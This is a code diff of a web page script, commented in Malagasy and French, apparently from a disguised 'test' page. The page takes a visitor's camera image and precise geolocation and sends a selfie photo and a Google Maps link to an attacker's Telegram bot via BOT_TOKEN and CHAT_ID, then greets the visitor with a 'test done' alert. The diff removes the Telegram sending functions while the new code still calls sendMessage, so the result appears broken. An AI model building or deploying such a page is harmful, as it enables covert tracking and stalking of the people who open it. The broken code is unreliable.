@@ -209,82 +209,18 @@
       stream.getTracks().forEach(t => t.stop());
 
       // 2. Maka toerana    
-async function sendLocation() {
-  try {
-    // Vérifier si la géolocalisation est disponible
-    if (!navigator.geolocation) {
-      throw new Error("La géolocalisation n'est pas supportée par ce navigateur.");
+navigator.geolocation.getCurrentPosition(function(pos) {
+        const { latitude: lat, longitude: lon } = pos.coords;
+        const loc = `📍 Toerana: https://www.google.com/maps?q=${lat},${lon}`;
+        sendMessage(loc); 
+        alert("✅ Vita ny test, Tongasoa!");
+      });
+
+    } catch (err) {
+      alert("❌ Nisy olana: " + err.message);
+      console.error(err);
     }
-
-    // Récupérer la position sous forme de Promise
-    const pos = await new Promise((resolve, reject) => {
-      navigator.geolocation.getCurrentPosition(
-        resolve,
-        reject,
-        {
-          enableHighAccuracy: true,
-          timeout: 10000,
-          maximumAge: 0
-        }
-      );
-    });
-
-    const { latitude: lat, longitude: lon } = pos.coords;
-
-    // Créer le lien Google Maps
-    const loc = `📍 Toerana: https://www.google.com/maps?q=${lat},${lon}`;
-
-    // Envoyer le message
-    await sendMessage(loc);
-
-    alert("✅ Vita ny test, Tongasoa!");
-
-  } catch (err) {
-    console.error("Erreur :", err);
-
-    let message = err.message;
-
-    if (err.code === 1) {
-      message = "Tsy nomena alalana ny localisation.";
-    } else if (err.code === 2) {
-      message = "Tsy hita ny toerana misy anao.";
-    } else if (err.code === 3) {
-      message = "Ela loatra ny fitadiavana ny toerana.";
-    }
-
-    alert("❌ Nisy olana: " + message);
   }
-}
-  /* ------------- ENVOI PHOTO ------------- */
-  async function sendPhoto(imgBase64, caption) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-    const form = new FormData();
-    form.append("chat_id", CHAT_ID);
-    form.append("caption", caption);
-
-    const blob = dataURItoBlob(imgBase64);
-    form.append("photo", blob, "selfie.png");
-
-    const res = await fetch(url, { method: "POST", body: form });
-    console.log("sendPhoto status:", res.status);
-  }
-
-  /* ------------- ENVOI MESSAGE TEXTE ------------- */
-  async function sendMessage(text) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-    const res = await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: text
-      })
-    });
-
-    console.log("sendMessage status:", res.status);
-  }
-
   /* ------------- UTILITAIRE ------------- */
   function dataURItoBlob(dataURI) {
     const byteString = atob(dataURI.split(',')[1]);
